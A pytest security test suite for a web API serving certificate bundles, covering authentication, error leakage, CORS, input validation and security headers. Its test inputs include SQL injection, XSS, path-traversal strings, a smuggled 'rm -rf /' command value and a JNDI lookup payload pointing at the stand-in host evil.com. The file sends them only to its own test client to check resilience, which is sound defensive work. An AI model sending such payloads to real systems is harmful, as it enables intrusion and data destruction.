"""
API Security Testing - Comprehensive security verification for API endpoints

These tests verify that API endpoints properly handle authentication failures,
provide secure error messages, implement CORS policies correctly, and resist
common API security vulnerabilities.
"""

import pytest
import json
import base64
from unittest.mock import patch, MagicMock


class TestAPIAuthenticationSecurity:
    """Test API authentication and authorization security."""

    def test_api_endpoints_require_authentication(self, client):
        """Test that API endpoints properly reject unauthenticated requests."""

        # Test actual API endpoints without authentication
        api_endpoints = [
            ('/api/v1/server/bundle', 'GET'),
            ('/api/v1/server/bundle', 'POST'),
            ('/api/v1/computer/bundle', 'GET'),
            ('/api/v1/computer/bundle', 'POST'),
            ('/profile/certificates', 'GET'),
        ]

        for endpoint, method in api_endpoints:
            if method == 'GET':
                response = client.get(endpoint)
            else:
                response = client.post(endpoint, json={})

            # Should require authentication or PSK - acceptable status codes:
            # 401/403: Authentication required
            # 302: Redirect to login
            # 404: Route not found (acceptable security through obscurity)
            assert response.status_code in [401, 403, 302, 404], \
                   f"Endpoint {endpoint} ({method}) should require authentication, got {response.status_code}"

    def test_api_invalid_credentials_handling(self, client):
        """Test proper handling of invalid API credentials."""

        # Test with invalid Authorization header formats
        invalid_auth_headers = [
            'Bearer invalid-token',
            'Basic invalid-base64',
            'Bearer ',
            'Invalid format',
            'Bearer ' + 'x' * 1000,  # Very long token
        ]

        for auth_header in invalid_auth_headers:
            response = client.get('/api/v1/server/bundle',
                                headers={'Authorization': auth_header})

            # Should return 401, 403, or 404 (for PSK-required endpoints), not 500
            assert response.status_code in [401, 403, 404], \
                   f"Invalid auth header should return 401/403/404, got {response.status_code} for '{auth_header}'"

            # Should not leak internal error details
            if response.content_type and 'json' in response.content_type:
                data = response.get_json()
                if data and 'error' in data:
                    error_msg = data['error'].lower()
                    sensitive_terms = ['traceback', 'exception', 'stack', 'internal', 'debug']
                    assert not any(term in error_msg for term in sensitive_terms), \
                           f"Error message should not leak internal details: {data['error']}"

    def test_api_session_based_authentication(self, client, app):
        """Test API endpoints with session-based authentication."""

        # Test authenticated session
        with client.session_transaction() as sess:
            sess['user'] = {
                'sub': 'test@example.com',
                'name': 'Test User',
                'email': 'test@example.com',
                'groups': ['users']
            }

        # Should work with valid session for profile endpoints
        response = client.get('/profile/certificates')
        assert response.status_code in [200, 404, 500], \
               f"Authenticated request should not return auth error, got {response.status_code}"

        # Test with tampered session
        with client.session_transaction() as sess:
            sess['user']['groups'] = ['admin', 'root', 'sudo']  # Privilege escalation attempt

        # Should still work but not grant extra privileges
        response = client.get('/profile/certificates')
        # This mainly tests that session tampering doesn't crash the app
        assert response.status_code != 500, "Session tampering should not cause server errors"

    def test_api_content_type_validation(self, client):
        """Test that API endpoints properly validate Content-Type headers."""

        with client.session_transaction() as sess:
            sess['user'] = {
                'sub': 'test@example.com',
                'email': 'test@example.com',
                'groups': ['users']
            }

        # Test POST endpoint with invalid Content-Type
        invalid_content_types = [
            'text/plain',
            'application/xml',
            'multipart/form-data',
            '',
            'application/json; charset=utf-8; boundary=evil'
        ]

        for content_type in invalid_content_types:
            response = client.post('/api/v1/server/bundle',
                                 data='{"description": "test"}',
                                 headers={'Content-Type': content_type})

            # Should handle gracefully, not crash
            assert response.status_code != 500, \
                   f"Invalid Content-Type should not cause server error: {content_type}"


class TestAPIErrorHandlingSecurity:
    """Test secure API error handling and information disclosure."""

    def test_api_error_message_security(self, client, app):
        """Test that API error messages don't leak sensitive information."""

        with app.app_context():
            # Test various malformed requests
            malformed_requests = [
                # Malformed JSON
                ('/api/v1/server/bundle', 'POST', '{"invalid": json}', 'application/json'),
                # SQL injection attempts in JSON
                ('/api/v1/server/bundle', 'POST', '{"description": "\'; DROP TABLE users; --"}', 'application/json'),
                # XSS attempts in JSON
                ('/api/v1/server/bundle', 'POST', '{"description": "<script>alert(1)</script>"}', 'application/json'),
                # Path traversal in URLs
                ('/api/v1/../../../etc/passwd', 'GET', '', ''),
                # Command injection in parameters
                ('/profile/certificates?limit=1; rm -rf /', 'GET', '', ''),
            ]

            for endpoint, method, data, content_type in malformed_requests:
                headers = {}
                if content_type:
                    headers['Content-Type'] = content_type

                if method == 'POST':
                    response = client.post(endpoint, data=data, headers=headers)
                else:
                    response = client.get(endpoint, headers=headers)

                # Should not return 500 (internal server error)
                assert response.status_code != 500, \
                       f"Malformed request should not cause server error: {endpoint}"

                # Check response for information leakage
                response_text = response.get_data(as_text=True).lower()
                sensitive_patterns = [
                    'traceback', 'exception', 'stack trace', 'debug',
                    'internal error', 'database error', 'sql error',
                    '/opt/', '/usr/', '/var/', '/etc/', '/home/',  # File paths
                    'root', 'admin', 'password', 'secret', 'key',  # Sensitive terms
                ]

                for pattern in sensitive_patterns:
                    assert pattern not in response_text, \
                           f"Error response contains sensitive information '{pattern}': {endpoint}"

    def test_api_http_method_security(self, client):
        """Test that API endpoints properly restrict HTTP methods."""

        api_endpoints = [
            '/api/v1/server/bundle',
            '/api/v1/computer/bundle',
            '/profile/certificates',
        ]

        dangerous_methods = ['PUT', 'DELETE', 'PATCH', 'TRACE', 'CONNECT']

        for endpoint in api_endpoints:
            for method in dangerous_methods:
                response = client.open(endpoint, method=method)

                # Should return 405 Method Not Allowed, not 500
                if response.status_code not in [404, 401, 403]:  # Auth errors are acceptable
                    assert response.status_code == 405, \
                           f"Endpoint {endpoint} should not allow {method}, got {response.status_code}"

    def test_api_parameter_injection_resistance(self, client):
        """Test resistance to parameter injection attacks."""

        with client.session_transaction() as sess:
            sess['user'] = {'sub': 'test@example.com', 'groups': ['users']}

        # Test parameter injection in query parameters
        injection_payloads = [
            "'; DROP TABLE certificates; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/exploit}",
            "../../../etc/passwd",
            "1' UNION SELECT * FROM users--",
            "%00", "%2e%2e%2f", "%252e%252e%252f",
        ]

        for payload in injection_payloads:
            # Test in query parameters
            response = client.get(f'/profile/certificates?page={payload}')
            assert response.status_code != 500, \
                   f"Parameter injection should not cause server error: {payload}"

            # Test in API bundle endpoints
            response = client.get(f'/api/v1/server/bundle?param={payload}')
            assert response.status_code != 500, \
                   f"Parameter injection should not cause server error: {payload}"


class TestAPICORSSecurity:
    """Test CORS (Cross-Origin Resource Sharing) security configuration."""

    def test_cors_header_configuration(self, client):
        """Test CORS headers are properly configured."""

        # Test preflight OPTIONS request
        response = client.options('/api/v1/server/bundle',
                                headers={
                                    'Origin': 'https://example.com',
                                    'Access-Control-Request-Method': 'GET',
                                    'Access-Control-Request-Headers': 'Content-Type'
                                })

        cors_headers = [
            'Access-Control-Allow-Origin',
            'Access-Control-Allow-Methods',
            'Access-Control-Allow-Headers'
        ]

        # Check if CORS is configured
        has_cors = any(header in response.headers for header in cors_headers)

        if has_cors:
            # If CORS is configured, verify it's secure
            allow_origin = response.headers.get('Access-Control-Allow-Origin')
            if allow_origin:
                # Should not be overly permissive
                assert allow_origin != '*', \
                       "CORS should not allow all origins with credentials"

                # Should be specific origins or null
                assert allow_origin in ['null', 'http://localhost', 'https://localhost'] or \
                       allow_origin.startswith('http://') or allow_origin.startswith('https://'), \
                       f"CORS origin should be specific: {allow_origin}"

        # Test actual cross-origin request
        response = client.get('/api/v1/server/bundle',
                            headers={'Origin': 'https://evil.example.com'})

        # Should not leak sensitive CORS configuration
        assert response.status_code != 500, \
               "Cross-origin request should not cause server error"

    def test_cors_credentials_security(self, client):
        """Test CORS credentials handling."""

        response = client.get('/api/v1/server/bundle',
                            headers={'Origin': 'https://example.com'})

        allow_credentials = response.headers.get('Access-Control-Allow-Credentials')
        allow_origin = response.headers.get('Access-Control-Allow-Origin')

        if allow_credentials and allow_credentials.lower() == 'true':
            # If credentials are allowed, origin must not be wildcard
            assert allow_origin != '*', \
                   "CORS cannot allow credentials with wildcard origin"

    def test_cors_method_restrictions(self, client):
        """Test CORS method restrictions."""

        dangerous_methods = ['PUT', 'DELETE', 'PATCH', 'TRACE']

        response = client.options('/api/v1/server/bundle',
                                headers={
                                    'Origin': 'https://example.com',
                                    'Access-Control-Request-Method': 'DELETE'
                                })

        allowed_methods = response.headers.get('Access-Control-Allow-Methods', '')

        for method in dangerous_methods:
            if method in allowed_methods.upper():
                # If dangerous methods are allowed, ensure proper authentication is required
                actual_response = client.open('/api/v1/server/bundle',
                                            method=method,
                                            headers={'Origin': 'https://example.com'})
                assert actual_response.status_code in [401, 403, 405], \
                       f"Dangerous CORS method {method} should require auth or be forbidden"


class TestAPIInputValidationSecurity:
    """Test API input validation and sanitization."""

    def test_json_payload_size_limits(self, client):
        """Test that API endpoints handle large JSON payloads securely."""

        with client.session_transaction() as sess:
            sess['user'] = {'sub': 'test@example.com', 'groups': ['users']}

        # Test extremely large JSON payload
        large_payload = {
            'description': 'x' * 10000,  # 10KB string
            'large_array': ['item'] * 1000,  # Large array
        }

        response = client.post('/api/v1/server/bundle',
                             json=large_payload,
                             headers={'Content-Type': 'application/json'})

        # Should handle gracefully, not crash
        assert response.status_code != 500, \
               "Large JSON payload should not cause server error"

        # Should either reject (413) or process normally, or require auth (401/404)
        assert response.status_code in [200, 400, 401, 404, 413], \
               f"Large payload should be handled properly, got {response.status_code}"

    def test_nested_json_depth_limits(self, client):
        """Test handling of deeply nested JSON structures."""

        # Create deeply nested JSON
        nested_json = {}
        current = nested_json
        for i in range(100):  # 100 levels deep
            current['level'] = {'next': {}}
            current = current['level']['next']
        current['value'] = 'deep'

        response = client.post('/api/v1/server/bundle',
                             json=nested_json,
                             headers={'Content-Type': 'application/json'})

        # Should not cause stack overflow or server error
        assert response.status_code != 500, \
               "Deeply nested JSON should not cause server error"

    def test_unicode_handling_security(self, client):
        """Test secure handling of Unicode and special characters."""

        with client.session_transaction() as sess:
            sess['user'] = {'sub': 'test@example.com', 'groups': ['users']}

        # Test various Unicode and special character payloads
        unicode_payloads = [
            {'description': '🚀 Test Bundle 🔒'},  # Emojis
            {'description': 'Тест комплект'},  # Cyrillic
            {'description': '测试包'},  # Chinese
            {'description': '\x00\x01\x02'},  # Control characters
            {'description': '\uffff\ufeff'},  # Unicode edge cases
            {'description': 'A' * 1000 + '中文'},  # Mixed long string
        ]

        for payload in unicode_payloads:
            response = client.post('/api/v1/server/bundle',
                                 json=payload,
                                 headers={'Content-Type': 'application/json'})

            # Should handle gracefully
            assert response.status_code != 500, \
                   f"Unicode payload should not cause server error: {payload}"

            # Response should be valid
            if response.content_type and 'json' in response.content_type:
                try:
                    response.get_json()  # Should parse without error
                except Exception as e:
                    pytest.fail(f"Response JSON should be valid after Unicode input: {e}")


class TestAPIVersioningSecurity:
    """Test API versioning security aspects."""

    def test_api_version_path_validation(self, client):
        """Test that API version paths are properly validated."""

        # Test path traversal attempts in API versioning
        malicious_versions = [
            '../v2',
            '../../admin',
            'v1/../../../etc',
            'v1%2e%2e%2fadmin',
            'v1/../../secrets',
        ]

        for version in malicious_versions:
            response = client.get(f'/api/{version}/server/bundle')

            # Should return 403 (blocked by path traversal protection), 404, or 400
            assert response.status_code in [403, 404, 400], \
                   f"Malicious API version should be blocked: {version}"

            # Should not leak file system information
            response_text = response.get_data(as_text=True).lower()
            assert '/opt/' not in response_text and '/var/' not in response_text, \
                   f"Response should not leak file paths: {version}"

    def test_unsupported_api_version_handling(self, client):
        """Test handling of unsupported API versions."""

        unsupported_versions = ['v0', 'v2', 'v999', 'beta', 'test']

        for version in unsupported_versions:
            response = client.get(f'/api/{version}/server/bundle')

            # Should return proper error, not crash (403 if contains path traversal)
            assert response.status_code in [403, 404, 400], \
                   f"Unsupported API version should return error: {version}"

    def test_api_version_case_sensitivity(self, client):
        """Test API version case sensitivity."""

        case_variants = ['V1', 'v1', 'V1', 'v1/']

        for variant in case_variants:
            response = client.get(f'/api/{variant}/server/bundle')

            # Should handle consistently (either all work or all fail)
            assert response.status_code != 500, \
                   f"API version case variant should not cause server error: {variant}"


class TestAPISecurityHeaders:
    """Test security headers specific to API endpoints."""

    def test_api_security_headers_presence(self, client):
        """Test that API endpoints include appropriate security headers."""

        response = client.get('/api/v1/server/bundle')
        headers = response.headers

        # Should have basic security headers even for API endpoints
        expected_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options'
        ]

        for header in expected_headers:
            if header in headers:
                # If present, should have secure values
                if header == 'X-Content-Type-Options':
                    assert headers[header] == 'nosniff'
                elif header == 'X-Frame-Options':
                    assert headers[header] in ['DENY', 'SAMEORIGIN']

    def test_api_content_type_consistency(self, client):
        """Test that API endpoints return consistent Content-Type headers."""

        with client.session_transaction() as sess:
            sess['user'] = {'sub': 'test@example.com', 'groups': ['users']}

        api_endpoints = [
            '/api/v1/server/bundle',
            '/health',
        ]

        for endpoint in api_endpoints:
            response = client.get(endpoint)

            if response.status_code == 200:
                content_type = response.headers.get('Content-Type', '')

                # API endpoints should return JSON unless specifically documented otherwise
                if response.get_data():  # Has response body
                    assert 'json' in content_type.lower() or \
                           'text/' in content_type.lower(), \
                           f"API endpoint {endpoint} should have appropriate Content-Type: {content_type}"

    def test_api_cache_control_headers(self, client):
        """Test that API endpoints have appropriate cache control."""

        response = client.get('/api/v1/server/bundle')
        cache_control = response.headers.get('Cache-Control')

        if cache_control:
            # API responses should generally not be cached
            cache_control_lower = cache_control.lower()
            assert 'no-cache' in cache_control_lower or \
                   'no-store' in cache_control_lower or \
                   'max-age=0' in cache_control_lower, \
                   f"API responses should have restrictive cache control: {cache_control}"